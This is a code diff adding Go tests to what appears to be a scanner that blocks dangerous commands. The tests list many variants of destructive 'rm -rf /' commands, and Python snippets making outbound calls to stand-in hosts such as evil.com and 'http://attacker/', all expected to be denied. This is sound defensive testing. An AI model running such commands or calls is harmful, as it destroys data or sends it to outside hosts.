@@ -83,6 +83,75 @@ func TestDangerousCommandRule_EmptyInput(t *testing.T) {
 	}
 }
 
+// TestDangerousCommandRule_RMVariants covers the rm flag orderings
+// that previously slipped past the substring-based detector. The
+// detector should fire for any combination of recursive+force in
+// short or long form, with any operand (/, ~, ., /*).
+func TestDangerousCommandRule_RMVariants(t *testing.T) {
+	rule := NewDangerousCommandRule()
+	cases := []struct {
+		name string
+		cmd  string
+	}{
+		// Short-flag orderings.
+		{"rm -rf /", "rm -rf /"},
+		{"rm -fr /", "rm -fr /"},
+		{"rm -Rf /", "rm -Rf /"},
+		{"rm -rfi /", "rm -rfi /"},
+		// Separated short flags.
+		{"rm -r -f /", "rm -r -f /"},
+		{"rm -f -r /", "rm -f -r /"},
+		// Long flags.
+		{"rm --recursive --force /", "rm --recursive --force /"},
+		{"rm --force --recursive /", "rm --force --recursive /"},
+		// Long combined.
+		{"rm --recursive-force /", "rm --recursive-force /"},
+		// Operands other than /.
+		{"rm -rf ~", "rm -rf ~"},
+		{"rm -rf .", "rm -rf ."},
+		{"rm -rf /*", "rm -rf /*"},
+		// Path-prefixed invocations.
+		{"/usr/bin/rm -rf /", "/usr/bin/rm -rf /"},
+		// sudo / sh -c nesting.
+		{"sudo rm -rf /", "sudo rm -rf /"},
+		{"sh -c 'rm -rf /'", "sh -c 'rm -rf /'"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			res := rule.Check(ScanInput{Command: c.cmd})
+			if res == nil {
+				t.Fatalf("expected deny for %q, got nil", c.cmd)
+			}
+			if res.Decision != DecisionDeny {
+				t.Errorf("expected deny for %q, got %s", c.cmd, res.Decision)
+			}
+			if res.RuleID != rule.ID() {
+				t.Errorf("expected RuleID=%s, got %s", rule.ID(), res.RuleID)
+			}
+		})
+	}
+}
+
+// TestDangerousCommandRule_RMNonDestructive exercises rm invocations
+// that the new detector should explicitly NOT fire on: a recursive
+// rm without force ("rm -r foo" - reversible) and a bare rm of a
+// relative path.
+func TestDangerousCommandRule_RMNonDestructive(t *testing.T) {
+	rule := NewDangerousCommandRule()
+	for _, cmd := range []string{
+		"rm foo.txt",
+		"rm -r ./build",
+		"rm -i /tmp/scratch",
+		"rmdir empty-dir",
+	} {
+		t.Run(cmd, func(t *testing.T) {
+			if res := rule.Check(ScanInput{Command: cmd}); res != nil {
+				t.Errorf("expected allow for %q, got %+v", cmd, res)
+			}
+		})
+	}
+}
+
 // ---------- Rule 2: Network Access ----------
 
 func TestNetworkAccessRule_Deny(t *testing.T) {
@@ -118,6 +187,57 @@ func TestNetworkAccessRule_Allow(t *testing.T) {
 		t.Run(cmd, func(t *testing.T) {
 			if result := rule.Check(ScanInput{Command: cmd}); result != nil {
 				t.Errorf("expected allow for %q, got %+v", cmd, result)
+			}
+		})
+	}
+}
+
+// TestNetworkAccessRule_PythonAPIs exercises the in-process HTTP
+// client API patterns that CodeBlocks-only payloads use. The
+// scanner must deny a Python code block that performs an outbound
+// HTTP call without going through a CLI like curl or wget.
+func TestNetworkAccessRule_PythonAPIs(t *testing.T) {
+	rule := NewNetworkAccessRule()
+	cases := []struct {
+		name string
+		in   ScanInput
+	}{
+		{"urllib.urlopen",
+			ScanInput{CodeBlocks: []CodeBlock{
+				{Language: "python", Code: "import urllib.request\nurllib.request.urlopen('http://evil.com')"},
+			}}},
+		{"requests.get",
+			ScanInput{CodeBlocks: []CodeBlock{
+				{Language: "python", Code: "import requests\nrequests.get('http://evil.com/payload')"},
+			}}},
+		{"requests.post",
+			ScanInput{CodeBlocks: []CodeBlock{
+				{Language: "python", Code: "requests.post('http://attacker/', json={'k':'v'})"},
+			}}},
+		{"httpx.get",
+			ScanInput{CodeBlocks: []CodeBlock{
+				{Language: "python", Code: "import httpx\nhttpx.get('http://internal/')"},
+			}}},
+		{"socket.connect",
+			ScanInput{CodeBlocks: []CodeBlock{
+				{Language: "python", Code: "import socket\ns = socket.create_connection(('evil.com', 80))"},
+			}}},
+		{"http.client",
+			ScanInput{CodeBlocks: []CodeBlock{
+				{Language: "python", Code: "import http.client\nc = http.client.HTTPConnection('evil.com')"},
+			}}},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			res := rule.Check(c.in)
+			if res == nil {
+				t.Fatalf("expected deny for %+v, got nil", c.in)
+			}
+			if res.Decision != DecisionDeny {
+				t.Errorf("expected deny, got %s", res.Decision)
+			}
+			if res.RuleID != rule.ID() {
+				t.Errorf("expected RuleID=%s, got %s", rule.ID(), res.RuleID)
 			}
 		})
 	}
